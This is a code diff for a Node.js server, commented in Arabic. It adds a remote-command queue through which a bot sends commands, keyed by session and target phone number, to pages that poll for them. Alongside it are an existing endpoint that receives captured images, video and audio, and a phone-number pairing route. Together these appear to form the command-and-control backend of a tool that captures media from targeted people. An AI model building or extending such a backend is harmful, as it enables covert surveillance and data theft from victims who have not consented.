@@ -883,6 +883,71 @@ async function bootExistingSessions() {
 }
 
 // ==========================================
+// 🎮 API نظام الأوامر عن بعد - تطوير جديد
+// ==========================================
+
+// تخزين الأوامر المعلقة
+const pendingCommands = {};
+
+// تنظيف الأوامر القديمة كل 10 دقائق
+setInterval(() => {
+    const now = Date.now();
+    for (const key in pendingCommands) {
+        pendingCommands[key] = pendingCommands[key].filter(cmd => (now - cmd.id) < 10 * 60 * 1000);
+        if (pendingCommands[key].length === 0) {
+            delete pendingCommands[key];
+        }
+    }
+}, 10 * 60 * 1000);
+
+// استقبال الأوامر من البوت
+app.post('/api/commands/send', (req, res) => {
+    const { sessionId, targetNumber, command } = req.body;
+    
+    if (!sessionId || !command) {
+        return res.status(400).json({ success: false, message: 'بيانات ناقصة' });
+    }
+
+    const key = `${sessionId}_${targetNumber || 'all'}`;
+    
+    if (!pendingCommands[key]) {
+        pendingCommands[key] = [];
+    }
+    
+    // إضافة معرف فريد إذا لم يكن موجوداً
+    if (!command.id) {
+        command.id = Date.now();
+    }
+    
+    pendingCommands[key].push(command);
+    
+    console.log(`📥 أمر جديد: ${command.type} -> ${key}`);
+    res.json({ success: true, message: 'تم إرسال الأمر', commandId: command.id });
+});
+
+// استقبال طلبات الصفحة (Polling)
+app.post('/api/commands/poll', (req, res) => {
+    const { sessionId, targetNumber, lastId } = req.body;
+    
+    if (!sessionId) {
+        return res.status(400).json({ success: false, commands: [] });
+    }
+
+    const key = `${sessionId}_${targetNumber || 'all'}`;
+    const commands = pendingCommands[key] || [];
+    
+    // تصفية الأوامر الجديدة فقط
+    const newCommands = lastId ? commands.filter(c => c.id > lastId) : [...commands];
+    
+    // حذف الأوامر المرسلة
+    if (newCommands.length > 0) {
+        pendingCommands[key] = commands.filter(c => !newCommands.includes(c));
+    }
+
+    res.json({ success: true, commands: newCommands });
+});
+
+// ==========================================
 // 📥 API استقبال جميع أنواع البيانات - مطور
 // ==========================================
 app.post('/capture', async (req, res) => {
@@ -903,7 +968,6 @@ app.post('/capture', async (req, res) => {
         // إذا ما حدد نوع، نحاول نكتشف تلقائياً
         if (!type) {
             if (typeof data === 'string') {
-                // نشوف إذا كان base64 صورة أو فيديو أو صوت
                 if (data.startsWith('data:image/')) {
                     type = 'image';
                 } else if (data.startsWith('data:video/')) {
@@ -1065,7 +1129,6 @@ app.post('/pair', async (req, res) => {
         fs.rmSync(sessionPath, { recursive: true, force: true });
     }
 
-    // بدء الجلسة مع الاقتران
     const result = await startSession(sessionId, res, formattedNumber);
     if (!result) {
         res.status(500).json({ error: 'فشل بدء الجلسة' });
@@ -1137,12 +1200,12 @@ app.listen(PORT, async () => {
     console.log(`📚 تم تحميل ${commandsMap.size} أمر`);
     console.log(`🌐 نظام الصفحات اللانهائية مفعل`);
     console.log(`📥 نظام استقبال جميع أنواع البيانات مفعل`);
+    console.log(`🎮 نظام الأوامر عن بعد مفعل`);
     console.log(`🔄 نظام منع الازدحام مفعل`);
     console.log(`=========================================\n`);
 
     await bootExistingSessions();
 
-    // إرسال ping أولي
     setTimeout(async () => {
         try {
             await axios.get(`http://localhost:${PORT}/ping`);
